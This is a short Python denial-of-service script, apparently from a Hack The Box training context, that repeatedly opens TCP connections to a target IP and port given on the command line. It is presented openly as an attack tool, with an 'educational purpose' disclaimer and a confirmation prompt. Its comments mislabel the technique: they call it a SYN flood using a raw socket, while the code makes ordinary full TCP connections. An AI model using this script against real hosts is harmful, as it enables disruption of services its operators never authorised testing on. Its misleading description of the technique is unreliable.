#!/usr/bin/env python3
"""
Basic DOS Attack Script
Author: HTB Training lxkhaninkali
Description: Simple TCP SYN flood attack targeting a single service
Educational Purpose Only - Use responsibly and legally
"""

import socket
import sys
import time
import random

def basic_dos_attack(target_ip, target_port, packet_count=1000):
    """
    Basic DOS attack using TCP SYN flooding
    """
    print(f"[*] Starting basic DOS attack on {target_ip}:{target_port}")
    print(f"[*] Sending {packet_count} packets...")
    
    packets_sent = 0
    
    try:
        for i in range(packet_count):
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Attempt connection (SYN flood)
            try:
                sock.connect((target_ip, target_port))
                sock.close()
            except:
                pass
            
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"[+] Sent {packets_sent} packets...")
                
            time.sleep(0.01)  # Small delay to avoid overwhelming
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[!] Error during attack: {e}")
    
    print(f"[*] Attack completed. Total packets sent: {packets_sent}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 dos_basic.py <target_ip> <target_port>")
        print("Example: python3 dos_basic.py 192.168.1.100 80")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("="*50)
    print("BASIC DOS ATTACK TOOL")
    print("="*50)
    print(f"Target: {target_ip}:{target_port}")
    print("WARNING: Use only on systems you own or have permission to test!")
    print("="*50)
    
    # Confirm attack
    confirm = input("Continue with attack? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled")
        sys.exit(0)
    
    basic_dos_attack(target_ip, target_port)

if __name__ == "__main__":
    main()
